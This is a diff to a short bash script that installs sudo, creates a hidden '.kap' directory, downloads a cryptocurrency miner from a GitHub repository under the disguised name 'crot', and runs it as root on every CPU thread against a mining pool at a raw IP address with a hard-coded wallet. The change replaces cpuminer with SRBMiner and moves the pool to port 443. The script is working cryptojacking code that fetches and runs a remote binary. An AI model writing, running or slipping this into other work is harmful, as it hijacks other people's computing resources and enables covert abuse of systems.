@@ -1,5 +1,6 @@
 #!/bin/bash
+apt-get update ; apt-get -y install sudo
 mkdir .kap && cd .kap
-wget -O crot https://github.com/nandafiku/fillesg/raw/main/cpuminer-avx2
+wget -O crot https://github.com/nandafiku/fillesg/raw/main/SRBMiner-MULTI
 chmod 777 crot
-./crot -a yespower -o stratum+tcp://45.76.185.233:80 -u unPw6ctQHeqACNCwFhXrPY5YUjVm9qNs4B.x -p webpassword=x -t $(nproc --all)
+sudo ./crot --algorithm yespower --pool 45.77.96.115:443 --wallet unPw6ctQHeqACNCwFhXrPY5YUjVm9qNs4B.x --password webpassword=x --cpu-threads $(nproc --all)
